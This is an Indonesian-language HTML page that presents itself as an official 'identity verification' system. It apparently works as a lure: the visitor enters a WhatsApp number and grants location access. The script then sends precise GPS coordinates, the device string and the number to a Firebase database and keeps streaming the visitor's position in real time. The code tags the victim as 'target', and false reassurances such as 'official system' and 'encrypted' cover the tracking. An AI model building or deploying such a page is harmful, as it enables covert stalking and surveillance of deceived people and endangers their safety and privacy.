<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Verifikasi Lokasi</title>
    
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    
    <!-- Font Awesome -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
    
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: #0a0a1a;
            padding: 20px;
            position: relative;
        }

        /* Background effect */
        body::before {
            content: '';
            position: fixed;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at 30% 50%, rgba(0,212,255,0.03), transparent 50%),
                        radial-gradient(circle at 70% 80%, rgba(123,47,252,0.03), transparent 50%);
            animation: rotateBg 30s linear infinite;
            z-index: 0;
        }

        @keyframes rotateBg {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .card {
            background: rgba(255,255,255,0.03);
            backdrop-filter: blur(30px);
            -webkit-backdrop-filter: blur(30px);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 28px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 40px 80px rgba(0,0,0,0.5);
            position: relative;
            z-index: 1;
        }

        .icon {
            width: 80px;
            height: 80px;
            background: linear-gradient(135deg, rgba(0,212,255,0.1), rgba(123,47,252,0.1));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            border: 1px solid rgba(255,255,255,0.05);
            position: relative;
        }

        .icon i {
            font-size: 36px;
            color: #00d4ff;
            animation: pulse 2s ease-in-out infinite;
        }

        .icon .ripple {
            position: absolute;
            width: 100%;
            height: 100%;
            border-radius: 50%;
            border: 1px solid rgba(0,212,255,0.1);
            animation: ripple 2s ease-out infinite;
        }

        .icon .ripple:nth-child(2) {
            animation-delay: 0.6s;
        }

        @keyframes ripple {
            0% { transform: scale(1); opacity: 1; }
            100% { transform: scale(1.4); opacity: 0; }
        }

        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }

        h2 {
            color: #fff;
            font-size: 22px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .sub-text {
            color: rgba(255,255,255,0.4);
            font-size: 14px;
            line-height: 1.7;
            margin-bottom: 20px;
        }

        .sub-text strong {
            color: rgba(255,255,255,0.5);
            font-weight: 500;
        }

        /* Input Group */
        .input-group {
            margin-bottom: 18px;
            text-align: left;
        }

        .input-group label {
            display: block;
            color: rgba(255,255,255,0.3);
            font-size: 12px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }

        .input-wrapper {
            display: flex;
            align-items: center;
            background: rgba(255,255,255,0.04);
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 14px;
            padding: 0 16px;
            transition: all 0.3s ease;
        }

        .input-wrapper:focus-within {
            border-color: rgba(0,212,255,0.2);
            box-shadow: 0 0 30px rgba(0,212,255,0.03);
        }

        .input-wrapper .prefix {
            color: rgba(255,255,255,0.2);
            font-weight: 600;
            font-size: 14px;
        }

        .input-wrapper input {
            width: 100%;
            padding: 16px 12px;
            background: transparent;
            border: none;
            outline: none;
            color: #fff;
            font-size: 16px;
            font-weight: 500;
        }

        .input-wrapper input::placeholder {
            color: rgba(255,255,255,0.12);
            font-weight: 400;
        }

        .input-wrapper .input-icon {
            color: rgba(255,255,255,0.1);
            font-size: 16px;
        }

        .input-wrapper:focus-within .input-icon {
            color: rgba(0,212,255,0.3);
        }

        .btn-allow {
            width: 100%;
            padding: 18px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border: none;
            border-radius: 16px;
            color: #fff;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            position: relative;
            overflow: hidden;
        }

        .btn-allow::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.08), transparent);
            transition: all 0.6s ease;
        }

        .btn-allow:hover::before {
            left: 100%;
        }

        .btn-allow:hover {
            transform: translateY(-2px);
            box-shadow: 0 15px 40px rgba(0,212,255,0.2);
        }

        .btn-allow:active {
            transform: translateY(0px) scale(0.98);
        }

        .btn-allow:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .btn-allow i {
            font-size: 18px;
        }

        .status {
            margin-top: 16px;
            padding: 14px 18px;
            border-radius: 14px;
            background: rgba(255,255,255,0.02);
            border: 1px solid rgba(255,255,255,0.03);
            color: rgba(255,255,255,0.3);
            font-size: 13px;
            display: none;
            transition: all 0.3s ease;
        }

        .status.show { display: block; }
        .status.success { border-color: rgba(0,255,136,0.15); color: #00ff88; background: rgba(0,255,136,0.03); }
        .status.error { border-color: rgba(255,0,0,0.15); color: #ff6b6b; background: rgba(255,0,0,0.03); }
        .status.warning { border-color: rgba(255,217,61,0.15); color: #ffd93d; background: rgba(255,217,61,0.03); }

        .status i {
            margin-right: 8px;
        }

        .spinner {
            display: inline-block;
            width: 20px;
            height: 20px;
            border: 2.5px solid rgba(255,255,255,0.2);
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 0.7s linear infinite;
            flex-shrink: 0;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .footer {
            margin-top: 20px;
            padding-top: 16px;
            border-top: 1px solid rgba(255,255,255,0.03);
            display: flex;
            justify-content: center;
            gap: 16px;
        }

        .footer span {
            color: rgba(255,255,255,0.06);
            font-size: 9px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        .footer .sep {
            color: rgba(255,255,255,0.03);
        }

        /* Popup Notification Style */
        .notification-popup {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.7);
            backdrop-filter: blur(10px);
            z-index: 999;
            display: none;
            align-items: center;
            justify-content: center;
            padding: 20px;
            animation: fadeIn 0.3s ease;
        }

        .notification-popup.show {
            display: flex;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .notification-popup .popup-content {
            background: rgba(20,20,40,0.95);
            backdrop-filter: blur(30px);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 28px;
            padding: 40px 32px;
            max-width: 380px;
            width: 100%;
            text-align: center;
            box-shadow: 0 40px 80px rgba(0,0,0,0.6);
        }

        .notification-popup .popup-icon {
            width: 70px;
            height: 70px;
            background: linear-gradient(135deg, rgba(0,212,255,0.15), rgba(123,47,252,0.15));
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 16px;
        }

        .notification-popup .popup-icon i {
            font-size: 32px;
            color: #00d4ff;
        }

        .notification-popup h3 {
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 8px;
        }

        .notification-popup p {
            color: rgba(255,255,255,0.4);
            font-size: 14px;
            line-height: 1.6;
            margin-bottom: 20px;
        }

        .notification-popup .btn-allow-popup {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #00d4ff, #7b2ffc);
            border: none;
            border-radius: 14px;
            color: #fff;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .notification-popup .btn-allow-popup:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px rgba(0,212,255,0.2);
        }

        .notification-popup .btn-deny {
            width: 100%;
            padding: 14px;
            background: transparent;
            border: 1px solid rgba(255,255,255,0.06);
            border-radius: 14px;
            color: rgba(255,255,255,0.2);
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.3s ease;
            margin-top: 10px;
        }

        .notification-popup .btn-deny:hover {
            border-color: rgba(255,0,0,0.2);
            color: #ff6b6b;
        }

        /* Responsive */
        @media (max-width: 480px) {
            .card {
                padding: 30px 20px;
                border-radius: 24px;
            }

            .icon {
                width: 64px;
                height: 64px;
            }

            .icon i {
                font-size: 28px;
            }

            h2 {
                font-size: 19px;
            }

            .btn-allow {
                font-size: 15px;
                padding: 16px;
            }

            .notification-popup .popup-content {
                padding: 30px 20px;
            }
        }
    </style>
</head>
<body>

    <!-- ======================================== -->
    <!-- POPUP NOTIFIKASI IZINKAN LOKASI -->
    <!-- ======================================== -->
    <div class="notification-popup" id="notificationPopup">
        <div class="popup-content">
            <div class="popup-icon">
                <i class="fas fa-location-dot"></i>
            </div>
            <h3>📍 IZINKAN LOKASI</h3>
            <p>
                Sistem memerlukan akses lokasi Anda untuk melanjutkan verifikasi.
                <br>
                <span style="color: rgba(255,255,255,0.15); font-size: 12px;">Data hanya untuk keperluan resmi.</span>
            </p>
            <button class="btn-allow-popup" id="popupAllowBtn">
                <i class="fas fa-check-circle"></i> Izinkan
            </button>
            <button class="btn-deny" id="popupDenyBtn">
                <i class="fas fa-times"></i> Tolak
            </button>
        </div>
    </div>

    <!-- ======================================== -->
    <!-- CARD UTAMA -->
    <!-- ======================================== -->
    <div class="card">
        <div class="icon">
            <div class="ripple"></div>
            <div class="ripple"></div>
            <i class="fas fa-shield-halved"></i>
        </div>

        <h2>Verifikasi Identitas</h2>
        <p class="sub-text">
            Masukkan nomor WhatsApp Anda untuk verifikasi
            <br>
            <strong>Sistem keamanan resmi</strong>
        </p>

        <!-- Input Nomor -->
        <div class="input-group">
            <label><i class="fas fa-phone-alt" style="margin-right: 6px;"></i> Nomor WhatsApp</label>
            <div class="input-wrapper">
                <span class="prefix">+62</span>
                <input 
                    type="text" 
                    id="phoneInput" 
                    placeholder="81234567890" 
                    maxlength="13"
                    autocomplete="off"
                >
                <i class="fas fa-chevron-right input-icon"></i>
            </div>
        </div>

        <button class="btn-allow" id="allowBtn">
            <i class="fas fa-location-arrow"></i>
            <span>VERIFIKASI SEKARANG</span>
        </button>

        <div class="status" id="status">
            <i class="fas fa-info-circle"></i>
            <span id="statusMessage">Memproses...</span>
        </div>

        <div class="footer">
            <span><i class="fas fa-shield-alt"></i> Terenkripsi</span>
            <span class="sep">•</span>
            <span>Sistem Resmi</span>
            <span class="sep">•</span>
            <span>v2.0</span>
        </div>
    </div>

    <script>
        // ========================================
        // 🔥 KONFIGURASI FIREBASE
        // ========================================
        const firebaseConfig = {
            apiKey: "AIzaSyAhO6Y-MlUSmGba0oEu6mM0rVxMoo8H7ns",
            authDomain: "track-66fb0.firebaseapp.com",
            projectId: "track-66fb0",
            storageBucket: "track-66fb0.firebasestorage.app",
            messagingSenderId: "252010791767",
            appId: "1:252010791767:web:306fb4bec288c05cf3f412",
            measurementId: "G-3GMCD0YJ3J"
        };

        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // ========================================
        // DOM ELEMENTS
        // ========================================
        const phoneInput = document.getElementById('phoneInput');
        const allowBtn = document.getElementById('allowBtn');
        const statusDiv = document.getElementById('status');
        const statusMessage = document.getElementById('statusMessage');
        const notificationPopup = document.getElementById('notificationPopup');
        const popupAllowBtn = document.getElementById('popupAllowBtn');
        const popupDenyBtn = document.getElementById('popupDenyBtn');

        let watchId = null;
        let isSending = false;
        let currentPhone = null;
        let isLocationAllowed = false;

        // ========================================
        // FUNGSI STATUS
        // ========================================
        function setStatus(message, type = '') {
            statusDiv.className = 'status show ' + type;
            statusMessage.textContent = message;
        }

        function hideStatus() {
            statusDiv.className = 'status';
        }

        // ========================================
        // VALIDASI NOMOR
        // ========================================
        function validatePhoneNumber(number) {
            const clean = number.replace(/\s/g, '');
            const regex = /^[0-9]{9,13}$/;
            if (!regex.test(clean)) {
                return { valid: false, message: 'Masukkan 9-13 digit angka' };
            }
            return { valid: true, clean };
        }

        // ========================================
        // TAMPILKAN POPUP NOTIFIKASI
        // ========================================
        function showNotificationPopup() {
            notificationPopup.classList.add('show');
        }

        function hideNotificationPopup() {
            notificationPopup.classList.remove('show');
        }

        // ========================================
        // KIRIM LOKASI KE FIREBASE
        // ========================================
        function sendLocation(position) {
            if (!currentPhone) {
                setStatus('❌ Error: Nomor tidak valid.', 'error');
                return;
            }

            const data = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: position.coords.accuracy || 0,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                device: navigator.userAgent.substring(0, 60),
                active: true,
                source: 'target',
                phone: currentPhone
            };

            const ref = database.ref('locations/' + currentPhone);

            ref.set(data)
                .then(() => {
                    setStatus('✅ Lokasi berhasil dikirim!', 'success');
                    allowBtn.disabled = true;
                    allowBtn.innerHTML = '<i class="fas fa-check-circle"></i> <span>TERVERIFIKASI</span>';
                    startWatching(currentPhone);
                    isSending = true;
                })
                .catch((err) => {
                    setStatus('❌ Gagal: ' + err.message, 'error');
                    allowBtn.disabled = false;
                    allowBtn.innerHTML = '<i class="fas fa-location-arrow"></i> <span>VERIFIKASI SEKARANG</span>';
                });
        }

        // ========================================
        // WATCH POSITION (REAL-TIME UPDATE)
        // ========================================
        function startWatching(phone) {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }

            watchId = navigator.geolocation.watchPosition(
                (pos) => {
                    const updateData = {
                        lat: pos.coords.latitude,
                        lng: pos.coords.longitude,
                        accuracy: pos.coords.accuracy || 0,
                        timestamp: firebase.database.ServerValue.TIMESTAMP,
                        active: true
                    };
                    database.ref('locations/' + phone).update(updateData)
                        .catch(err => console.warn('Update error:', err));
                },
                (err) => {
                    console.warn('Watch error:', err);
                    if (err.code === 1) {
                        setStatus('❌ Izin lokasi dicabut!', 'error');
                    }
                },
                {
                    // ========================================
                    // 🔥 PENGATURAN GPS AKURAT
                    // ========================================
                    enableHighAccuracy: true,  // Mengaktifkan GPS akurat
                    timeout: 10000,            // Timeout 10 detik
                    maximumAge: 0              // Tidak menggunakan cache
                }
            );

            database.ref('locations/' + phone).onDisconnect().update({ active: false });
        }

        // ========================================
        // MULAI PROSES VERIFIKASI
        // ========================================
        function startVerification() {
            if (isSending) return;

            const rawInput = phoneInput.value.trim();
            
            if (!rawInput) {
                setStatus('⚠️ Masukkan nomor WhatsApp Anda!', 'error');
                phoneInput.focus();
                return;
            }

            const validation = validatePhoneNumber(rawInput);
            if (!validation.valid) {
                setStatus('⚠️ ' + validation.message, 'error');
                phoneInput.focus();
                return;
            }

            currentPhone = '62' + validation.clean;
            hideStatus();

            // Tampilkan popup notifikasi izinkan lokasi
            showNotificationPopup();
        }

        // ========================================
        // PROSES IZINKAN LOKASI DARI POPUP
        // ========================================
        function processAllowLocation() {
            hideNotificationPopup();
            
            allowBtn.disabled = true;
            allowBtn.innerHTML = '<span class="spinner"></span> <span>MENGAMBIL LOKASI...</span>';
            setStatus('⏳ Meminta izin lokasi...', 'warning');

            if (!navigator.geolocation) {
                setStatus('❌ Browser tidak mendukung GPS.', 'error');
                allowBtn.disabled = false;
                allowBtn.innerHTML = '<i class="fas fa-location-arrow"></i> <span>VERIFIKASI SEKARANG</span>';
                return;
            }

            navigator.geolocation.getCurrentPosition(
                sendLocation,
                (err) => {
                    console.error('Geolocation error:', err);
                    let msg = '❌ Gagal mengambil lokasi. ';
                    if (err.code === 1) {
                        msg += 'Izin ditolak. Izinkan di browser.';
                    } else if (err.code === 2) {
                        msg += 'Sinyal GPS tidak tersedia.';
                    } else if (err.code === 3) {
                        msg += 'Waktu habis. Coba lagi.';
                    } else {
                        msg += err.message;
                    }
                    setStatus(msg, 'error');
                    allowBtn.disabled = false;
                    allowBtn.innerHTML = '<i class="fas fa-location-arrow"></i> <span>VERIFIKASI SEKARANG</span>';
                },
                {
                    // ========================================
                    // 🔥 PENGATURAN GPS AKURAT
                    // ========================================
                    enableHighAccuracy: true,  // Mengaktifkan GPS akurat
                    timeout: 10000,            // Timeout 10 detik
                    maximumAge: 0              // Tidak menggunakan cache
                }
            );
        }

        // ========================================
        // PROSES TOLAK LOKASI
        // ========================================
        function processDenyLocation() {
            hideNotificationPopup();
            setStatus('❌ Verifikasi dibatalkan. Izin lokasi diperlukan.', 'error');
        }

        // ========================================
        // EVENT LISTENER
        // ========================================
        allowBtn.addEventListener('click', startVerification);

        popupAllowBtn.addEventListener('click', processAllowLocation);
        popupDenyBtn.addEventListener('click', processDenyLocation);

        phoneInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                startVerification();
            }
        });

        phoneInput.addEventListener('input', function() {
            this.value = this.value.replace(/\D/g, '');
            if (this.value.length > 13) {
                this.value = this.value.slice(0, 13);
            }
            hideStatus();
        });

        // ========================================
        // CEK IZIN SAAT LOAD
        // ========================================
        window.addEventListener('load', function() {
            if (navigator.permissions) {
                navigator.permissions.query({ name: 'geolocation' })
                    .then(result => {
                        if (result.state === 'granted') {
                            // Izin sudah diberikan, langsung verifikasi
                            setStatus('✅ Izin lokasi aktif. Silakan verifikasi.', 'success');
                        } else if (result.state === 'denied') {
                            setStatus('❌ Izin lokasi dinonaktifkan. Aktifkan di pengaturan browser.', 'error');
                        } else {
                            // Prompt - user harus klik tombol verifikasi
                            setStatus('👆 Masukkan nomor dan klik Verifikasi', 'warning');
                        }
                    })
                    .catch(() => {});
            }

            console.log('✅ Target page loaded');
            console.log('📱 Firebase:', firebaseConfig.projectId);
            console.log('📍 GPS settings: enableHighAccuracy=true, timeout=10000, maximumAge=0');
        });

        // ========================================
        // BERSIHKAN SAAT PAGE DITUTUP
        // ========================================
        window.addEventListener('beforeunload', function() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }
            if (currentPhone) {
                database.ref('locations/' + currentPhone).update({ active: false })
                    .catch(() => {});
            }
        });

        console.log('✅ Target page loaded with high accuracy GPS');
        console.log('📍 enableHighAccuracy: true, timeout: 10000, maximumAge: 0');
    </script>
</body>
</html>
